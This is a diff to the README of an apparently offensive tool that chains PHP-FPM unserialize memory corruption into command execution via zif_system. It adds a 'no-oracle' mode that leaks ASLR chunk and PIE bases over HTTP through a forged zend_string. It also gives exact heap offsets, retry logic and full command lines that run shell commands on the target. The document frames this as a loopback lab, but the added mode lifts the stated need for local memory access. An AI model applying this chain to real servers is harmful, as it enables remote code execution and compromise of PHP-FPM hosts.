@@ -85,6 +85,39 @@ The 4 MB arm phase is posted to a **second endpoint** (the builder pool,
 `memory_limit=64M`, `cleanup=Off`): posting it to the 8M chain pool would kill
 the consumer worker before the fire.
 
+### 2b. HTTP-only endgame (no `/proc/<pid>/mem`)
+
+`no-oracle` removes the memory oracle from the exploit path. It needs two
+absolute values that are stable for the lifetime of the FPM master (the
+workers are forked from it): the Zend-MM chunk base and the php-fpm PIE base.
+By default the client leaks both over HTTP; `--chunk`/`--pie` override them,
+and local `/proc/<pid>/maps` is only a fallback (it never opens
+`/proc/<pid>/mem`):
+
+```sh
+python3 tools/php2shell_fpm.py \
+  --base http://127.0.0.1:8110 --builder http://127.0.0.1:8111 \
+  --version 8.4.26 --command 'id>out/p1' --proof-file out/p1 \
+  no-oracle
+```
+
+The 16384-byte reclaim covers both struct slots: `d = chunk + 0x81000`
+with control offset `0xfe8`, and `d = chunk + 0x82000` with `0x1fe8`
+(`fpm.no_oracle.candidates` in the profile). A throw-away pads+big request
+normalizes the heap after the first arm, so the first candidate usually wins;
+a mismatch crashes the worker and the next candidate is tried. The worker
+still dies on success (HTTP 502) and the proof is the command's output file.
+
+The HTTP leak reuses the stale-session string: the builder's `bigvar.php`
+stores `k0..k3` before a 4 MB tail, a reclaimed 16 KB big field plants a forged
+`zend_string` header over the freed k1 slot, its length spans the stale zval
+array (chunk pointer) and the `execute_ex` handler table inside the chunk (PIE
+pointer), and the app reflects the bytes. The read is retried because the
+worker can abort after answering; `leak` prints the two bases.
+Absolute bases change when the master restarts, so the leak is repeated per
+run. This mode removes both the runtime `/proc/<pid>/mem` dependency and the
+need to know the ASLR bases in advance.
+
 ### 3. Forge — reference → fake array → `zif_system`
 
 The reclaimed buffer carries, at the offsets `php_var_unserialize` will read:
@@ -168,8 +201,14 @@ Pools (from `lab/fpm/php-fpm.conf.in`):
 - **builder** — `memory_limit=64M`, `cleanup=Off` (builds the ~4 MB session
   files consumed by `producer` and `build-oom`).
 
-Requirements: `yama ptrace_scope=0` (the `/proc/<pid>/mem` oracle), Python
-3.11+, gcc for the user-prefix PHP builds (`lab/fpm/build*.sh`).
+The builder webroot includes `bigvar.php` (the arm used by `leak`),
+`leakvar.php` (a tunable variant for geometry research) and `refb.php` (a
+benign short session). `app.php` can emit `X-Debug-*` diagnostics to
+`/tmp/p2s_dbg.txt`; those headers are lab-only instrumentation.
+
+Requirements: Python 3.11+, gcc for the user-prefix PHP builds
+(`lab/fpm/build*.sh`). The default `endgame` also needs `yama
+ptrace_scope=0` for the `/proc/<pid>/mem` oracle; `no-oracle` does not.
 
 ```sh
 python3 tools/php2shell_fpm_labs.py up --version 8.4.26
@@ -202,6 +241,12 @@ python3 tools/php2shell_fpm.py \
   --base http://127.0.0.1:8110 --builder http://127.0.0.1:8111 \
   --version 8.4.26 --command 'id>out/p1' --proof-file out/p1 \
   endgame
+
+# same fire, no /proc/<pid>/mem at exploit time
+python3 tools/php2shell_fpm.py \
+  --base http://127.0.0.1:8110 --builder http://127.0.0.1:8111 \
+  --version 8.4.26 --command 'id>out/p1' --proof-file out/p1 \
+  no-oracle
 ```
 
 (Global options come before the subcommand.)
@@ -219,15 +264,17 @@ python3 tools/php2shell_auto.py \
 Tests: the unit suite always runs; the live lab tests are gated:
 
 ```sh
-python3 -m unittest discover -s tests -v          # 48 tests, skips live FPM
+python3 -m unittest discover -s tests -v          # 51 tests, skips live FPM
 PHP2SHELL_FPM_LAB=1 python3 -m unittest \
-  tests.test_fpm.FpmLabIntegrationTests -v        # primitive + endgame live
+  tests.test_fpm.FpmLabIntegrationTests -v        # primitive + endgame + no-oracle live
 ```
 
 ## Limitations and future work
 
-- **Oracle lab mode.** The remote (no-oracle) leak of `d` is future work; the
-  shipped chain needs `/proc/<pid>/mem` and therefore runs loopback-only.
+- **Oracle lab mode.** `endgame` still uses the `/proc/<pid>/mem` oracle to
+  resolve `d`. `no-oracle` drops that read at exploit time and leaks the
+  chunk/PIE bases over HTTP by default; `--chunk`/`--pie` and local maps are
+  overrides/fallbacks. The shipped chain still targets the loopback lab.
 - **Per-build offsets.** `basic_globals` / `zif_system` / `zval_ptr_dtor` are
   PIE-relative offsets for the exact FPM build; another distro or version
   needs its own profile (`sapi: "fpm"`, see `profiles/schema.json`).
